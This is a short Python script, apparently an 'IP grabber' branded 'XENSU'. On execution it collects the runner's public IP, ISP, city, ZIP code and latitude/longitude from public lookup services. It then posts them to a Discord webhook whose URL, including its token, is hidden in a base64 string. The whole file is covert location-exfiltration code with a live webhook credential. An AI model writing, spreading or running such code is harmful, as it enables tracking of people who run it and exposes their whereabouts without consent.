
import requests
import base64

def get_ip_info():
    try:
        ip = requests.get("https://api64.ipify.org?format=json").json().get("ip")
        details = requests.get(f"http://ip-api.com/json/{ip}").json()
        return ("\n------------ XENSU -----------"
                f"\nIP: {details.get('query')}"
                f"\nISP: {details.get('isp')}"
                f"\nCountry: {details.get('country')}"
                f"\nRegion: {details.get('regionName')}"
                f"\nCity: {details.get('city')}"
                f"\nZIP: {details.get('zip')}"
                f"\nLat: {details.get('lat')}"
                f"\nLon: {details.get('lon')}"
                "\n------------ XENSU --------------")
    except Exception as e:
        return f"Error retrieving IP info: {e}"

webhook = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NDkyNzAyNDEyODEzMTIwMy9xRnN3eFFBaGJxYy1UcXpGcGFtS0hGbms2eVY5Mi1VcWVtZVZXcjB0LTJ4SXlHMi1LRUhlZDlJenFuSUEzNm1lQUNSdg==").decode()
requests.post(webhook, json={"content": get_ip_info()})
    